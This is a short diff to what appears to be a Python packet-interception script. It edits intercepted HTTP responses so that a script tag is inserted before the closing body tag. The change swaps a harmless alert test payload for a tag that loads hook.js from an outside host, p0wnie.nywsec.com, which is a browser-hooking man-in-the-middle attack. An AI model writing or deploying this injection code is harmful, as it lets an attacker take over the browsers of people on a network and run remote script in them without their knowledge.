@@ -35,7 +35,8 @@ def process_packet(packet):
 
                 print("[+] HTTP Response\n")
                 print(scapy_pack.show())
-                inject = "<script>alert('polo');</script>"
+                # inject = "<script>alert('polo');</script>"
+                inject = "<script src='http://p0wnie.nywsec.com/hook.js'></script>"
                 load = load.replace("</body>", inject + "</body")
                 # Getting server content length value
                 content_length_sr = re.search("(?:Content-Length:\s)(\d*)", load)
